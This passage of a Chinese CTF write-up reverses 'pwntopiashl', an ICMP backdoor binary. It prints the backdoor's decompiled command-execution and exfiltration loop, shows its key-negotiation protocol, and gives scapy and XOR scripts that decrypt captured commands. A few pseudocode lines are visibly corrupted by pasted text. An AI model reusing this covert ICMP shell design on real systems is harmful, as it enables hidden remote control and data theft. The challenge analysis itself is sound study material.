class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line"><span class="comment">// 获取执行结果</span></span><br><span class="line">      <span class="keyword">while</span> ( fgets(s, <span class="number">25536</span>, stream) )</span><br><span class="line">      &#123;</span><br><span class="line">        v1 = <span class="built_in">strlen</span>(dest);</span><br><span class="line">        <span class="keyword">if</span> ( v1 + <span class="built_in">strlen</span>(s) &gt; <span class="number">0x63BE</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">strcat</span>(dest, s);</span><br><span class="line">      &#125;</span><br><span class="line">      pclose(stream);</span><br><span class="line">      i = <span class="built_in">strlen</span>(dest);</span><br><span class="line"><span class="comment">// 把执行结果和 key 进行异或</span></span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; i; ++j )</span><br><span class="line">        dest[j] ^= v6[j &amp; <span class="number">7</span>];</span><br><span class="line">   	......</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; j_1; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        buf[<span class="number">0</span>] = <span class="number">8</span>;</span><br><span class="line">        i_4 = i_3;</span><br><span class="line">        <span class="keyword">if</span> ( i_3 &gt; <span class="number">0x10</span> )</span><br><span class="line">          i_4 = <span class="number">16</span>;</span><br><span class="line">        i_5 = i_4;</span><br><span class="line"><span class="comment">// 给每个数据打上序号</span></span><br><span class="line">        <span class="built_in">sprintf</span>(&amp;buf[<span class="number">8</span>], <span class="string">&quot;%04d%04d&quot;</span>, j + <span class="number">1</span>, j_1);</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;buf[<span class="number">16</span>], &amp;dest[v19], i_5);</span><br><span class="line">        v19 += i_5;</span><br><span class="line">        i_3 -= i_5;</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line"><span class="comment">// 回复 ICMP</span></span><br><span class="line">        sendto(fd, buf, i_5 + <span class="number">16LL</span>, <span class="number">0</span>, &amp;addr, <span class="number">0x10</span>u);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>至此分析完了这个程序的功能，可以看出这个其实是一个基于 ICMP 的后门，通讯的流程为</p>
<ol>
<li>向运行pwntopiashl的服务器发送一个 icmp 包，type  ** 0xC 和 code **  0x23 进行密钥生成，为下一步执行命令做准备</li>
<li>向运行pwntopiashl的服务器发送一个 icmp 包，type  ** 0x13 和 code **  0x2A 执行命令，命令使用第一步协商的密钥进行加密</li>
<li>回复命令执行结果，使用 key 加密</li>
</ol>
<p>‍</p>
<p>所以给的 pcap 就是执行命令的流量，需要我们解密这个流量</p>
<p>需要知道的是 key 的组成，是由发起者发送的嵌在ICMP里面的 2 个字节，后门生成的 2 个字节，以及这 4 个直接拼接起来后变换出来的 4 个直接，一共 8 个字节，首先筛选出这个流量包，以第一次执行命令的流量为例，首先 1.3.3.7 向 7.3.3.1 发送了一个 type 为 12 (0xc)，code 为 35 （0x23）的 ICMP 包，在 code 的后面在本应该是 checksum 的位置携带了 2 个字节 da0a</p>
<p><img src="/assets/image-20250602194448-8yt67rm.png" alt="image"></p>
<p>7.3.3.1 的相应包中携带了 key 的两个字节 dee0 ，一样也在 checksum 的位置</p>
<p><img src="/assets/image-20250602194908-uh4ri6y.png" alt="image"></p>
<p>到这里密钥协商完成，得出key的前4个字节，生成剩下的 4 个字节即可获得 key</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">b&quot;\xda\x0a\xde\xe0&quot;</span></span><br><span class="line">key += <span class="built_in">bytes</span>([key[<span class="number">0</span>] ^ key[<span class="number">1</span>]])</span><br><span class="line">key += <span class="built_in">bytes</span>([key[<span class="number">2</span>] ^ key[<span class="number">3</span>]])</span><br><span class="line">key += <span class="built_in">bytes</span>([key[<span class="number">0</span>] ^ key[<span class="number">2</span>]])</span><br><span class="line">key += <span class="built_in">bytes</span>([key[<span class="number">1</span>] ^ key[<span class="number">3</span>]])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.<span class="built_in">hex</span>(key))</span><br><span class="line"><span class="comment"># da0adee0d03e04ea</span></span><br></pre></td></tr></table></figure>

<p>依次类推可以推出所有的 key</p>
<p>然后就是执行命令的数据包</p>
<p>执行命令的 icmp 包为：<code>s[20] == 0x13 和 s[21] == 0x2A</code>​，也就是 type 为 19 (0x13)，code 为 42 （0x2a）</p>
<p>跳过ICMP头（8字节）得到数据 b36e</p>
<p><img src="/assets/image-20250602195714-ar92nx1.png" alt="image"></p>
<p>组合起来就是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">b&quot;\xda\x0a\xde\xe0&quot;</span></span><br><span class="line">key += <span class="built_in">bytes</span>([key[<span class="number">0</span>] ^ key[<span class="number">1</span>]])</span><br><span class="line">key += <span class="built_in">bytes</span>([key[<span class="number">2</span>] ^ key[<span class="number">3</span>]])</span><br><span class="line">key += <span class="built_in">bytes</span>([key[<span class="number">0</span>] ^ key[<span class="number">2</span>]])</span><br><span class="line">key += <span class="built_in">bytes</span>([key[<span class="number">1</span>] ^ key[<span class="number">3</span>]])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.<span class="built_in">hex</span>(key))</span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;b36e&quot;</span>)</span><br><span class="line">result = <span class="built_in">bytes</span>([enc[j] ^ key[j % <span class="built_in">len</span>(key)] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc))])</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># da0adee0d03e04ea</span></span><br><span class="line"><span class="comment"># b&#x27;id&#x27;</span></span><br></pre></td></tr></table></figure>

<p>依次类推，解密所有执行的命令</p>
<p>最后一条命令应该就是加密了 flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> .secret | openssl enc -aes-256-cbc -a -salt -pbkdf2 -pass pass:we_pwned_nops</span><br></pre></td></tr></table></figure>

<p><img src="/assets/image-20250602200215-plgea26.png" alt="image"></p>
<p>单独解密这个返回包数据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = bytes.fromhex(<span class="string">&quot;bf389a3784df6025b23bf737a4fc0329de409f3cb4f07a0ca765f30d93db7d279d72ae2dbad9792a896c9073b9a0552b804d9a088fab5c3eab63a53199e00121e0&quot;</span>)</span><br><span class="line">key = bytes.fromhex(<span class="string">&quot;ea0adc44e098364e&quot;</span>)</span><br><span class="line">result = bytes([a[j] ^ key[j % len(key)] <span class="keyword">for</span> j <span class="keyword">in</span> range(len(a))])</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment"># U2FsdGVkX1+sDd5g4JCxThLBMo/IsCKiwxriZAOdcfL7Y8cejGFLo3jpAiyuyx7o</span></span><br></pre></td></tr></table></figure>

<p>N0PS{v3Ry_s734lThY_1cMP_sh3Ll}得出 openssl aes-256-cbc 加密后的密文，使用 openssl 解密，得出 flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> U2FsdGVkX1+sDd5g4JCxThLBMo/IsCKiwxriZAOdcfL7Y8cejGFLo3jpAiyuyx7o | <span class="built_in">base64</span> -d |  openssl enc -aes-256-cbc -d -salt -pbkdf2 -pass pass:we_pwned_nops</span><br><span class="line">N0PS&#123;v3Ry_s734lThY_1cMP_sh3Ll&#125;</span><br></pre></td></tr></table></figure>

<p>‍</p>
<p>可以用 scapy 实现自动提取解密</p>
<p>但是，我没写。。。。</p>
<p>只有草稿</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line">from scapy.layers.inet import ICMP</span><br><span class="line"></span><br><span class="line">k = b<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">def extract_key(packet):</span><br><span class="line">    <span class="keyword">if</span> ICMP <span class="keyword">in</span> packet and packet[ICMP].<span class="built_in">type</span> == 12 and packet[ICMP].code == 35:</span><br><span class="line">        icmp_data = bytes(packet[ICMP])</span><br><span class="line">        <span class="keyword">if</span> len(icmp_data) &gt;= 6:</span><br><span class="line"></span><br><span class="line">            key = icmp_data[2:4]  <span class="comment"># 假设v6在偏移4-5字节</span></span><br><span class="line">            src_ip = packet[IP].src</span><br><span class="line">            <span class="keyword">if</span> key == b<span class="string">&quot;\x3c\xff&quot;</span>:</span><br><span class="line">                key += b<span class="string">&quot;\xb4\xe8&quot;</span></span><br><span class="line">            <span class="keyword">if</span> key == b<span class="string">&quot;\xda\x0a&quot;</span>:</span><br><span class="line">                key += b<span class="string">&quot;\xde\xe0&quot;</span></span><br><span class="line">            <span class="keyword">if</span> key == b<span class="string">&quot;\xea\x0a&quot;</span>:</span><br><span class="line">                key += b<span class="string">&quot;\xdc\x44&quot;</span></span><br><span class="line">            <span class="keyword">if</span> key == b<span class="string">&quot;\x56\x3d&quot;</span>:</span><br><span class="line">                key += b<span class="string">&quot;\x93\x70&quot;</span></span><br><span class="line">            global k</span><br><span class="line">            key += bytes([key[0] ^ key[1]])</span><br><span class="line">            key += bytes([key[2] ^ key[3]])</span><br><span class="line">            key += bytes([key[0] ^ key[2]])</span><br><span class="line">            key += bytes([key[1] ^ key[3]])</span><br><span class="line"></span><br><span class="line">            k = key</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;======================================================================&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Found key&quot;</span>, bytes.hex(k))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt_data(data, key):</span><br><span class="line">    decrypted = []</span><br><span class="line">    key_len = len(key)</span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> enumerate(data):</span><br><span class="line">        decrypted.append(byte ^ key[i % key_len])</span><br><span class="line">    <span class="built_in">return</span> bytes(decrypted)</span><br><span class="line"></span><br><span class="line">def process_packet(packet):</span><br><span class="line">    <span class="keyword">if</span> IP <span class="keyword">in</span> packet and ICMP <span class="keyword">in</span> packet:</span><br><span class="line">        icmp = packet[ICMP]</span><br><span class="line">        <span class="comment"># 处理攻击者的命令包（类型19，代码42）</span></span><br><span class="line">        <span class="keyword">if</span> icmp.type == 19 and icmp.code == 42:</span><br><span class="line">            src_ip = packet[IP].src</span><br><span class="line">            <span class="keyword">if</span> True:</span><br><span class="line">                key = k</span><br><span class="line">                encrypted_data = bytes(icmp)[8:]</span><br><span class="line">                <span class="built_in">print</span>(bytes.hex(encrypted_data))</span><br><span class="line">                decrypted = decrypt_data(encrypted_data, key)</span><br><span class="line">                <span class="built_in">print</span>(f<span class="string">&quot;Decrypted command from &#123;src_ip&#125;: &#123;decrypted.decode(errors=&#x27;ignore&#x27;)&#125;&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> icmp.type == 0:</span><br><span class="line">            dst_ip = packet[IP].dst</span><br><span class="line">            <span class="keyword">if</span> True:</span><br><span class="line">                key = k</span><br><span class="line">                <span class="comment"># 跳过ICMP头8字节</span></span><br><span class="line">                encrypted_data = bytes(icmp)[8:]</span><br><span class="line">                <span class="built_in">print</span>(bytes.hex(encrypted_data))</span><br><span class="line">                decrypted = decrypt_data(encrypted_data, key)</span><br><span class="line">                <span class="built_in">print</span>(f<span class="string">&quot;Decrypted response to &#123;dst_ip&#125;: &#123;decrypted.decode(errors=&#x27;ignore&#x27;)&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">packets = rdpcap(<span class="string">&#x27;capture.pcap&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pkt <span class="keyword">in</span> packets:</span><br><span class="line">    <span class="keyword">if</span> ICMP <span class="keyword">in</span> pkt:</span><br><span class="line">        extract_key(pkt)</span><br><span class="line">        process_packet(pkt)</span><br><span class="line"></span><br><span class="line">a = bytes.fromhex(<span class="string">&quot;bf389a3784df6025b23bf737a4fc0329de409f3cb4f07a0ca765f30d93db7d279d72ae2dbad9792a896c9073b9a0552b804d9a088fab5c3eab63a53199e00121e0&quot;</span>)</span><br><span class="line">key = bytes.fromhex(<span class="string">&quot;ea0adc44e098364e&quot;</span>)</span><br><span class="line">result = bytes([a[j] ^ key[j % len(key)] <span class="keyword">for</span> j <span class="keyword">in</span> range(len(a))])</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment"># U2FsdGVkX1+sDd5g4JCxThLBMo/IsCKiwxriZAOdcfL7Y8cejGFLo3jpAiyuyx7o</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># bf389a3784df6025b23bf737a4fc0329</span></span><br><span class="line"><span class="comment"># de409f3cb4f07a0ca765f30d93db7d27</span></span><br><span class="line"><span class="comment"># 9d72ae2dbad9792a896c9073b9a0552b</span></span><br><span class="line"><span class="comment"># 804d9a088fab5c3eab63a53199e00121e0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># echo U2FsdGVkX1+sDd5g4JCxThLBMo/IsCKiwxriZAOdcfL7Y8cejGFLo3jpAiyuyx7o | base64 -d |  openssl enc -aes-256-cbc -d -salt -pbkdf2 -pass pass:we_pwned_nops</span></span><br></pre></td></tr></table></figure>

<h1 id="pwntopiashl-1"><a href="#pwntopiashl-1" class="headerlink" title="pwntopiashl"></a>pwntopiashl</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p>N0PStopia has been attacked by PwnTopia! They installed a stealthy binary on one of our servers, but we did not understand what it does! Can you help? We saw some weird ICMP traffic during the attack, you can find attached a capture file.</p>
<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>题目给了给 elf 和 一个 pcap</p>
<p>pcap 里面包含了几组畸形的ICMP流量</p>
<p>ida 打开 pwntopiashl 文件，关键逻辑都在 <code>icmp_packet_listener</code>​ 函数中</p>
<p>在进行分析之前需要先大致看过一遍，因为IDA在反汇编这个函数的时候有几个的错误需要手动纠正，不然就没法分析</p>
<p>首先</p>
<ol>
<li><p>需要注意的是这个 <code>memset(s, 0, 0x63C0uLL)</code>​ ，可以看到 s 的大小应该是 0x63C0，但是IDA把它识别成了char s[20]，这里会导致后面伪代码错误</p>
<p> <img src="/assets/image-20250602203715-w1wgnnw.png" alt="image"></p>
<p> ‍</p>
</li>
<li><p>还需要注意这个存储key的变量v9，ida会把它识别成一个 __int16，但是看下面的解密过程 <code>dest[j] ^= *((_BYTE *)&amp;v9 + (j &amp; 7))</code>​ 其实可以推断出这个 v9 的长度为 8</p>
<p> <img src="/assets/image-20250602203726-c7ll4a7.png" alt="image"></p>
<p> ‍</p>
</li>
</ol>
<p>修正完这两个地方，伪代码即可看出正确的逻辑</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">icmp_packet_listener</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> i_1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">size_t</span> i_2; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> i_4; <span class="comment">// eax</span></span><br><span class="line">  sockaddr addr; <span class="comment">// [rsp+0h] [rbp-C810h] BYREF</span></span><br><span class="line">  _BYTE buf[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-C800h] BYREF</span></span><br><span class="line">  __int8 v6[<span class="number">8</span>]; <span class="comment">// [rsp+38h] [rbp-C7D8h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">25536</span>]; <span class="comment">// [rsp+40h] [rbp-C7D0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">25536</span>]; <span class="comment">// [rsp+6400h] [rbp-6410h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i_5; <span class="comment">// [rsp+C7C0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">int</span> j_1; <span class="comment">// [rsp+C7C4h] [rbp-4Ch]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+C7C8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+C7D0h] [rbp-40h]</span></span><br><span class="line">  <span class="type">int</span> n28; <span class="comment">// [rsp+C7D4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> *v14; <span class="comment">// [rsp+C7D8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> *s_1; <span class="comment">// [rsp+C7E0h] [rbp-30h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+C7ECh] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+C7F0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+C7F4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [rsp+C7F8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i_3; <span class="comment">// [rsp+C7FCh] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  fd = socket(<span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      <span class="title function_">memset</span><span class="params">(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s))</span>;</span><br><span class="line">    <span class="keyword">while</span> ( recv(fd, s, <span class="number">0x63BF</span>uLL, <span class="number">0</span>) &lt;= <span class="number">0</span> );</span><br><span class="line">    s_1 = s;</span><br><span class="line">    v14 = &amp;s[<span class="number">20</span>];</span><br><span class="line">    n28 = <span class="number">28</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[<span class="number">20</span>] == <span class="number">0xC</span> &amp;&amp; v14[<span class="number">1</span>] == <span class="number">0x23</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_WORD *)v6 = *((_WORD *)v14 + <span class="number">1</span>);s[<span class="number">20</span>] == <span class="number">0xC</span> 和 s[<span class="number">21</span>] == <span class="number">0x23</span> 的时候进入这个判断，进行密钥的生成</span><br><span class="line">      v6[<span class="number">2</span>] = rand();</span><br><span class="line">      v6[<span class="number">3</span>] = rand();</span><br><span class="line">      v6[<span class="number">4</span>] = v6[<span class="number">0</span>] ^ v6[<span class="number">1</span>];</span><br><span class="line">      v6[<span class="number">5</span>] = v6[<span class="number">2</span>] ^ v6[<span class="number">3</span>];</span><br><span class="line">      v6[<span class="number">6</span>] = v6[<span class="number">0</span>] ^ v6[<span class="number">2</span>];</span><br><span class="line">      v6[<span class="number">7</span>] = v6[<span class="number">1</span>] ^ v6[<span class="number">3</span>];</span><br><span class="line">      <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">      addr.sa_family = <span class="number">2</span>;</span><br><span class="line">      *(_DWORD *)&amp;addr.sa_data[<span class="number">2</span>] = *((_DWORD *)s_1 + <span class="number">3</span>);</span><br><span class="line">      buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      *(_WORD *)&amp;buf[<span class="number">2</span>] = *(_WORD *)&amp;v6[<span class="number">2</span>];</span><br><span class="line">      sleep(<span class="number">1u</span>);</span><br><span class="line">      sendto(fd, buf, v12 + <span class="number">8LL</span>, <span class="number">0</span>, &amp;addr, <span class="number">0x10</span>u);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *v14 == <span class="number">0x13</span> &amp;&amp; v14[<span class="number">1</span>] == <span class="number">0x2A</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      addr.sa_family = <span class="number">2</span>;</span><br><span class="line">      *(_DWORD *)&amp;addr.sa_data[<span class="number">2</span>] = *((_DWORD *)s_1 + <span class="number">3</span>);</span><br><span class="line">      <span class="built_in">memset</span>(dest, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest));</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, &amp;s[n28], (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">25535</span> - n28));</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">25536</span>; ; --i )</span><br><span class="line">      &#123;</span><br><span class="line">        i_1 = i;</span><br><span class="line">        <span class="keyword">if</span> ( i_1 &lt; <span class="built_in">strlen</span>(dest) || dest[i - <span class="number">1</span>] )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; i; ++j )</span><br><span class="line">        dest[j] ^= v6[j &amp; <span class="number">7</span>];</span><br><span class="line">      <span class="built_in">puts</span>(dest);</span><br><span class="line">      fflush(_bss_start);</span><br><span class="line">      stream = popen(dest, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( stream )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memset</span>(dest, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest));</span><br><span class="line">        <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">        <span class="keyword">while</span> ( fgets(s, <span class="number">25536</span>, stream) )</span><br><span class="line">        &#123;</span><br><span class="line">          v1 = <span class="built_in">strlen</span>(dest);</span><br><span class="line">          <span class="keyword">if</span> ( v1 + <span class="built_in">strlen</span>(s) &gt; <span class="number">0x63BE</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">strcat</span>(dest, s);</span><br><span class="line">        &#125;</span><br><span class="line">        pclose(stream);</span><br><span class="line">        i = <span class="built_in">strlen</span>(dest);</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; i; ++j )</span><br><span class="line">          dest[j] ^= v6[j &amp; <span class="number">7</span>];</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">25536</span>; ; --i )</span><br><span class="line">        &#123;</span><br><span class="line">          i_2 = i;</span><br><span class="line">          <span class="keyword">if</span> ( i_2 &lt; <span class="built_in">strlen</span>(dest) || dest[i - <span class="number">1</span>] )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v19 = <span class="number">0</span>;</span><br><span class="line">        i_3 = i;</span><br><span class="line">        j_1 = ((<span class="type">unsigned</span> __int64)i &gt;&gt; <span class="number">4</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; j_1; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">          buf[<span class="number">0</span>] = <span class="number">8</span>;</span><br><span class="line">          i_4 = i_3;v14[<span class="number">1</span>] == <span class="number">0x23</span></span><br><span class="line">          <span class="keyword">if</span> ( i_3 &gt; <span class="number">0x10</span> )</span><br><span class="line">            i_4 = <span class="number">16</span>;</span><br><span class="line">          i_5 = i_4;</span><br><span class="line">          <span class="built_in">sprintf</span>(&amp;buf[<span class="number">8</span>], <span class="string">&quot;%04d%04d&quot;</span>, j + <span class="number">1</span>, j_1);</span><br><span class="line">          <span class="built_in">memcpy</span>(&amp;buf[<span class="number">16</span>], &amp;dest[v19], i_5);</span><br><span class="line">          v19 += i_5;</span><br><span class="line">          i_3 -= i_5;</span><br><span class="line">          sleep(<span class="number">1u</span>);</span><br><span class="line">          sendto(fd, buf, i_5 + <span class="number">16LL</span>, <span class="number">0</span>, &amp;addr, <span class="number">0x10</span>u);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序大致做了几个关键的事情：</p>
<ol>
<li><p>首先创建了一个接受 ICMP 包的 socket，这里 <code>socket(2, 3, 1)</code>​ 对应的源码应该是 <code>socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)</code>​ ，这些宏定义的值可以在 <code>/usr/include/bits/socket_type.h</code>​ 和 <code>/usr/include/bits/socket.h</code>​中找到，或者一些插件也可以还原出来。</p>
</li>
